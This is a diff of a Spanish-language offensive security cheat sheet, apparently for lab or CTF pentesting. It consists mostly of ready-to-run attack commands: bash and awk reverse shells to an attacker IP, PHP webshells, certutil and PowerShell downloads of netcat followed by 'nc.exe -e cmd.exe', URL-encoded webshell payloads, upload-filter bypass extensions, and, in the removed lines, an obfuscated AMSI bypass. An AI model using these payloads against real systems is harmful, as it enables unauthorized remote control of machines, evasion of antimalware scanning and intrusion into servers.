@@ -24,7 +24,6 @@ Forward Shell  → via mkfifo → cuando reverse y bind están bloqueados por fi
 4. **IEX en memoria → no toca disco → más difícil de detectar**
 5. **Después de obtener shell → aplicar tratamiento TTY → ver nota Tratamiento_TTY.md**
 
----
 
 ## 1. LISTENERS EN KALI
 
@@ -43,8 +42,6 @@ Forward Shell  → via mkfifo → cuando reverse y bind están bloqueados por fi
   ❯ run enumerate.system.network  # Interfaces de red
   ❯ back                       # Ir a la terminal de la víctima
 ```
-
----
 
 ## 2. REVERSE SHELLS — LINUX
 
@@ -99,18 +96,16 @@ Forward Shell  → via mkfifo → cuando reverse y bind están bloqueados por fi
 ❯ awk 'BEGIN{s="/inet/tcp/0/<IP_KALI>/443";while(42){do{printf "shell>" |& s;s |& getline c;print c;while((c |& getline)>0)print |& s;close(c)}while(c!="exit")close(s)}}'
 ```
 
----
-
 ## 3. REVERSE SHELLS — WINDOWS (POWERSHELL)
 
 ### Clásica - Subiendo Netcat a Temp
 ```bash 
 # Subir Netcat 
-❯ certutil -urlcache -f http://<IP>/nc.exe C:\Windows\Temp\nc.exe
-❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/nc.exe','C:\Windows\Temp\nc.exe')"
+❯ certutil -urlcache -f http://<IP>/nc.exe C:\Temp\nc.exe
+❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/nc.exe','C:\Temp\nc.exe')"
 
 # Ejecutar la Revershell 
-❯ C:\Windows\Temp\nc.exe <IP_KALI> <PUERTO> -e cmd.exe
+❯ C:\Temp\nc.exe <IP_KALI> <PUERTO> -e cmd.exe
 ```
 
 ### Runas
@@ -279,12 +274,21 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 # Guardar como .pyz → ejecutable en Windows al hacer doble click
 ```
 
-
----
-
 ## 4. WEBSHELLS
 
-### PHP — Webshell básica
+### Extensiones PHP para bypass de filtros
+```
+.php .php3 .php4 .php5 .php6 .php7
+.pht .phtm .phtml .phar .pHP
+```
+
+```php
+# PHP de prueba para un inicio de subida 
+<?php
+echo "PHP_EXEC_OK";
+?>
+```
+## PHP — Webshell básica
 
 * [reverse.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) <-- Funcional 
 
@@ -294,14 +298,16 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 
 # Alternativas equivalentes
 <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
+
 <?php system($_GET["cmd"]); ?>
+
 <?php $output = shell_exec($_GET["cmd"]); echo "<pre>$output</pre>"; ?>
 
-# Reverse shell directa en PHP
+# Reverse shell directa en PHP para Kali 
 <?php system("bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'"); ?>
 ```
 
-### PHP — Via curl + index.html
+### PHP — Via curl + index.html para Kali 
 ```bash
 # En Kali → crear index.html con el payload
 ❯ nano index.html
@@ -317,7 +323,7 @@ bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'
 ❯ bash /tmp/reverse
 ```
 
-### PHP — Via archivo .php
+### PHP — Via archivo .php para Kali 
 ```bash
 # En Kali → crear reverse.php
 ❯ nano reverse.php
@@ -330,12 +336,22 @@ bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'
 ❯ php /tmp/reverse.php
 ```
 
-### PHP — Ejecutar desde URL
+### PHP — Ejecutar desde URL para Kali 
 ```bash
 # Con webshell ya subida → ejecutar reverse shell URL encoded
 ❯ ?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<IP_KALI>%2F443%200%3E%261%27
 # Decodificado: ?cmd=bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'
 ```
+
+### PHP — Ejecutar desde URL para Windows 
+```bash 
+# Subir Netcat desde la web 
+	http://IP/cmd.php?cmd=certutil -urlcache -f http://<IP>/nc.exe C:\Temp\nc.exe
+
+# Ejecutar una revershell desde la web 
+	http://IP/cmd.php?cmd=C:\Temp\nc.exe <IP_KALI> <PUERTO> -e cmd.exe
+```
+
 
 ### PHP — Subida de imagen con código PHP
 ```php
@@ -361,12 +377,6 @@ bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'
   ❯ :help                    # Ver comandos disponibles
   ❯ :system_info             # Info del sistema
   ❯ ls                       # Listar directorio
-```
-
-### Extensiones PHP para bypass de filtros
-```
-.php .php3 .php4 .php5 .php6 .php7
-.pht .phtm .phtml .phar .pHP
 ```
 
 ### RCE vía MySQL
@@ -432,14 +442,6 @@ C:\inetpub\wwwroot\          → raíz del servidor web → acceder en http://IP
 C:\inetpub\wwwroot\uploads\  → si hay directorio de uploads
 ```
 
-### Insight
-- ASPX → IIS moderno (Windows Server 2012+) → usar -f aspx en msfvenom
-- ASP → IIS antiguo (Windows Server 2003/2008) → usar -f asp en msfvenom
-- Si WebDAV está habilitado → subir con cadaver directamente
-- Si hay upload en la web → probar subir .aspx directamente o con doble extensión shell.aspx.jpg
-
----
-
 ## 5. FORWARD SHELL (CUANDO REVERSE Y BIND ESTÁN BLOQUEADOS)
 
 ```bash
@@ -455,24 +457,4 @@ C:\inetpub\wwwroot\uploads\  → si hay directorio de uploads
 ❯ python3 tty_over_http.py
 # Simula una TTY interactiva a través de peticiones HTTP
 # Útil cuando el firewall bloquea conexiones salientes de la víctima
-```
-
----
-
-## 6. BYPASS AMSI (WINDOWS)
-
-```powershell
-# AMSI → Anti-Malware Scan Interface → detecta scripts maliciosos en PS
-# Bypassear antes de cargar herramientas como PowerView, SharpHound, etc.
-
-# Método 1 → Patch en memoria
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-
-# Método 2 → Ofuscado para evadir detección del bypass
-$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
-$b=$a.GetField('amsi'+'InitFailed','NonPublic,Static')
-$b.SetValue($null,$true)
-
-# Nota: El script Invoke-PowerShellTcp.ps1 cargado en memoria con IEX
-# ya evade AMSI al no escribir en disco
 ```
